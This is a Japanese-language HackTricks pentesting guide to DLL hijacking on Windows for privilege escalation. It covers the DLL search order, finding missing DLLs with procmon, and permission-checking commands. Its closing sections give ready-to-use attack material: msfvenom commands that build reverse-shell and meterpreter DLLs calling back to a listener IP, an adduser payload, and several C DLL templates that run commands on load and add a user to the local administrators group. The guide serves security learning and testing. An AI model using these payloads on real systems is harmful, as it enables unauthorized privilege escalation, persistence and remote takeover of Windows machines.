# Dll Hijacking

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter**で**フォロー**する 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
- **ハッキングトリックを共有するには、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubリポジトリに提出してください。**

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

**ハッキングキャリア**に興味がある方や**解読不能なものをハック**したい方 - **採用中です！**（_流暢なポーランド語の読み書きが必要です_）。

{% embed url="https://www.stmcyber.com/careers" %}

## 基本情報

DLLハイジャッキングは、信頼されたアプリケーションを悪意のあるDLLを読み込むように操作することを指します。この用語には、**DLLスプーフィング、インジェクション、およびサイドローディング**などの戦術が含まれます。これは主にコードの実行、持続性の達成、そして稀に特権昇格に使用されます。ここでは昇格に焦点を当てていますが、ハイジャッキングの方法は目的に関係なく一貫しています。

### 一般的な技術

DLLハイジャッキングには、アプリケーションのDLL読み込み戦略に依存する効果的な方法がいくつかあります。

1. **DLLの置換**: 正規のDLLを悪意のあるDLLと交換し、オプションでDLLプロキシングを使用して元のDLLの機能を保持します。
2. **DLLサーチオーダーハイジャック**: 悪意のあるDLLを正規のDLLの前に検索パスに配置し、アプリケーションの検索パターンを悪用します。
3. **ファントムDLLハイジャック**: アプリケーションが読み込むための悪意のあるDLLを作成し、それが存在しない必要なDLLであると思わせます。
4. **DLLリダイレクション**: `%PATH%`や`.exe.manifest` / `.exe.local`ファイルなどの検索パラメータを変更して、アプリケーションを悪意のあるDLLに誘導します。
5. **WinSxS DLLの置換**: WinSxSディレクトリ内の正規のDLLを悪意のあるDLLで置き換えることで、しばしばDLLサイドローディングと関連付けられる方法です。
6. **相対パスDLLハイジャック**: ユーザーが制御するディレクトリに悪意のあるDLLを配置し、コピーされたアプリケーションと似たようなバイナリプロキシ実行技術を模倣します。


## 欠落しているDllの検出

システム内の欠落しているDllを見つける最も一般的な方法は、[procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)を実行し、**次の2つのフィルターを設定**することです：

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

そして、**ファイルシステムアクティビティ**を表示します：

![](<../../.gitbook/assets/image (314).png>)

**一般的なdllを探している場合**は、数秒間これを実行しておきます。\
**特定の実行可能ファイル内の欠落しているdllを探している場合**は、「プロセス名」が「含む」ような別のフィルタを設定し、実行してからイベントのキャプチャを停止します。

## 欠落しているDllの悪用

特権昇格するためには、**特権プロセスが読み込もうとするdllを書き込むことができる**最適な機会があります。したがって、**オリジナルのdllよりも先に検索される場所**にdllを書き込むことができます（奇妙なケース）、または**dllが検索されるフォルダに書き込むことができます**が、オリジナルの**dllがどのフォルダにも存在しない**場合です。

### Dll検索順序

[**Microsoftのドキュメント**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **に、DLLが特定の方法で読み込まれる方法が記載されています。**

**Windowsアプリケーション**は、特定のシーケンスに従って一連の**事前定義された検索パス**に従ってDLLを探します。DLLハイジャッキングの問題は、有害なDLLがこれらのディレクトリの1つに戦略的に配置され、正規のDLLよりも先に読み込まれるようにすることで発生します。これを防ぐ解決策は、アプリケーションが必要とするDLLを参照する際に絶対パスを使用することを確認することです。

32ビットシステムでの**DLL検索順序**は以下の通りです：

1. アプリケーションが読み込まれたディレクトリ。
2. システムディレクトリ。このディレクトリのパスを取得するには[**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya)関数を使用します。(_C:\Windows\System32_)
3. 16ビットシステムディレクトリ。このディレクトリのパスを取得する関数はありませんが、検索されます。(_C:\Windows\System_)
4. Windowsディレクトリ。このディレクトリのパスを取得するには[**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya)関数を使用します。(_C:\Windows_)
5. 現在のディレクトリ。
6. PATH環境変数にリストされているディレクトリ。これには、**App Paths**レジストリキーで指定されたアプリケーションごとのパスは含まれません。**App Paths**キーは、DLL検索パスの計算時には使用されません。

これが**SafeDllSearchMode**が有効な状態での**デフォルト**の検索順序です。無効にするには、**HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode**レジストリ値を作成し、0に設定します（デフォルトは有効）。

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa)関数が**LOAD\_WITH\_ALTERED\_SEARCH\_PATH**で呼び出されると、検索は**LoadLibraryEx**が読み込んでいる実行可能モジュールのディレクトリから開始されます。

最後に、**dllは名前だけでなく絶対パスを指定して読み込まれる可能性があることに注意**してください。その場合、そのdllは**そのパスのみで検索されます**（dllに依存関係がある場合、名前で読み込まれたように検索されます）。

検索順序を変更する他の方法もありますが、ここでは説明しません。

#### Windowsドキュメントのdll検索順序の例外

Windowsドキュメントには、標準的なDLL検索順序に関する特定の例外が記載されています：

- メモリに読み込まれている**DLLと同じ名前を持つDLL**が見つかった場合、システムは通常の検索をバイパスします。代わりに、リダイレクションとマニフェストのチェックを実行し、メモリにすでにあるDLLにデフォルトで戻ります。**このシナリオでは、システムはDLLの検索を実行しません**。
- DLLが現在のWindowsバージョンの**既知のDLL**として認識される場合、システムはそのバージョンの既知のDLLとその依存するDLLを利用し、検索プロセスを**スキップ**します。レジストリキー**HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**には、これらの既知のDLLのリストが格納されています。
- DLLに依存関係がある場合、最初のDLLがフルパスで特定されたかどうかに関係なく、これらの依存するDLLの検索が**モジュール名だけで指定されたかのように**実行されます。

### 特権昇格

**要件**：

- **異なる特権で動作するプロセス**を特定し、または特定する（水平または垂直移動）、**DLLが欠落している**。
- **DLLが検索される任意のディレクトリに書き込みアクセス**が利用可能であることを確認します。この場所は、実行可能ファイルのディレクトリまたはシステムパス内のディレクトリである可能性があります。

はい、要件を見つけるのは**デフォルトでは特権のある実行可能ファイルがdllを欠落しているのは奇妙であり**、**システムパスのフォルダに書き込み権限を持っているのはさらに奇妙です**（通常はできません）。しかし、構成が誤っている環境では、これが可能です。\
要件を満たす幸運な場合、[UACME](https://github.com/hfiref0x/UACME)プロジェクトをチェックできます。**プロジェクトの主な目標はUACのバイパスですが**、おそらく書き込み権限のあるフォルダのパスを変更するだけで使用できるWindowsバージョンのDLLハイジャッキングのPoCが見つかるかもしれません。

フォルダの**アクセス許可を確認するには**、次のようにします：
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
そして、**PATH内のすべてのフォルダのアクセス許可を確認します**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
あなたは実行可能ファイルのインポートとDLLのエクスポートもチェックできます。
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
**Dllハイジャックを悪用して特権を昇格**するための完全なガイドについては、**System Pathフォルダ**に書き込み権限があるかどうかを確認してください：

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### 自動化ツール

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)は、システムPATH内の任意のフォルダに書き込み権限があるかどうかをチェックします。\
この脆弱性を発見するための他の興味深い自動化ツールには、**PowerSploit functions**があります：_Find-ProcessDLLHijack_、_Find-PathDLLHijack_、_Write-HijackDll_。

### 例

悪用可能なシナリオを見つけた場合、それを成功裏に悪用するために最も重要なことの1つは、**実行ファイルがそれからインポートするすべての関数を少なくともエクスポートするdllを作成すること**です。とにかく、Dllハイジャックは、中間インテグリティレベルから高いレベルに[**（UACをバイパスして）昇格する**](../authentication-credentials-uac-and-efs.md#uac)か、[**高いインテグリティからSYSTEMに**](./#from-high-integrity-to-system)**昇格する**のに便利です。**有効なdllを作成する方法**の例は、このdllハイジャックの実行に焦点を当てたdllハイジャック研究で見つけることができます：[**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**。**\
さらに、**次のセクション**では、**テンプレートとして役立つ基本的なdllコード**をいくつか見つけることができます。これらは、**必要のない関数がエクスポートされたdllを作成する**ために使用できます。

## **Dllの作成とコンパイル**

### **Dllプロキシ化**

基本的に、**Dllプロキシ**は、**ロードされるときに悪意のあるコードを実行**できるDllですが、**リアルライブラリへのすべての呼び出しをリレーすることで**、**公開**され、**機能**します。

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant)や[**Spartacus**](https://github.com/Accenture/Spartacus)というツールを使用すると、実際に**実行可能ファイルを指定し、プロキシ化したいライブラリを選択**して**プロキシ化されたdllを生成**するか、**Dllを指定**して**プロキシ化されたdllを生成**することができます。

### **Meterpreter**

**rev shellを取得（x64）:**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**メータープリンターを取得する（x86）:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**ユーザーを作成します（x86バージョンはx64バージョンは見当たりませんでした）:**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### あなた自身

複数のケースで、コンパイルしたDllは、被害者プロセスによってロードされる関数を**複数エクスポートする必要があります**。これらの関数が存在しない場合、**バイナリはそれらをロードできず、攻撃は失敗します**。
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## 参考文献
* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

**ハッキングキャリア**に興味がある方や、**解読不能なものをハック**したい方 - **採用中です！**（_流暢なポーランド語の読み書きが必要です_）。

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**Telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)を**フォロー**する
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有する

</details>
